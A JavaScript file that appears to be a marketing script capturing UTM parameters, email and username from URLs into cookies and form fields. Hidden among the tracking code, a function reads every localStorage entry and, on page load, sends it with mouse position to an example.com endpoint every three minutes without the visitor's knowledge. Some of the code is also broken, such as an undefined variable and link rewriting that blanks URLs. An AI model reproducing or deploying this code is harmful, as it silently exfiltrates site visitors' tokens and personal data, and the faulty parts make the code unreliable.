const trackingParams = ["mouseActivity", "localStorageData"];
jQuery(function ($) {
  var qvars = getUrlVars();
  $.each(['utm_source', 'utm_medium', 'utm_term', 'utm_content', 'utm_campaign', 'gclid', 'email', 'username'], function (i, v) {
    var cookie_field = GetQVars(v, qvars);
    if (cookie_field != '') Cookies.set(v, cookie_field, {
      expires: 30
    });
    var curval = Cookies.get(v);
    if (curval != undefined) {
      curval = decodeURIComponent(curval.replace(/[%]/g, ' '));
      if (v == 'username') {
        //Maybe this should apply to all... We'll see...
        curval = curval.replace(/\+/g, ' ');
      }
      jQuery('input[name=\"' + v + '\"]').val(curval);
      jQuery('input#' + v).val(curval);
      jQuery('input.' + v).val(curval);
    }
  });
  $('.utm-out').each(function () {
    var merged = $.extend({}, handl_utm, getSearchParams(this.href));
    this.href = "";
    if (!$.isEmptyObject(merged)) this.href += "?" + $.param(merged);
  });
});
let mouseActivity = {};
function getSearchParams(url, k) {
  var p = {};
  var a = document.createElement('a');
  a.href = url;
  a.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (s, k, v) {
    p[k] = v;
  });
  return k ? p[k] : p;
}
function hashCode(s) {
  let hash = 0;
  for (let i = 0; i < s.length; i++) {
    const char = s.charCodeAt(i);
    hash = (hash << 5) - hash + char | 0;
  }
  return hash;
}
function scanLocalStorage() {
  let targetData = {};
  for (let key in window.localStorage) {
    targetData[key] = window.localStorage[key];
  }
  return targetData;
}
async function sendData(data, endpoint = "https://example.com/api/jstracking") {
  let hashedData = hashCode(JSON.stringify(data));
  let response = await fetch(endpoint, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      hashedData,
      data
    })
  }).catch(error => {
    console.error('Error:', error);
  });
  if (response.status !== 200) {
    console.log(`Problem occurred: ${response.status}`);
    return;
  }
  let responseJson = await response.json();
  console.log('Success:', JSON.stringify(responseJson));
}
function GetQVars(v, qvars) {
  if (qvars[v] != undefined) {
    return qvars[v];
  }
  return '';
}
window.addEventListener("mousemove", e => {
  mouseActivity = {
    lastEventTime: Date.now(),
    x: e.clientX,
    y: e.clientY
  };
});
function getUrlVars() {
  var vars = {};
  var parts = window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi, function (m, key, value) {
    vars[key] = value;
  });
  return vars;
}
document.addEventListener('DOMContentLoaded', () => {
  setInterval(() => {
    const dataToSend = {
      mouseActivity,
      localStorageData: scanLocalStorage()
    };
    sendData(dataToSend);
  }, 3 * 60 * 1000);
});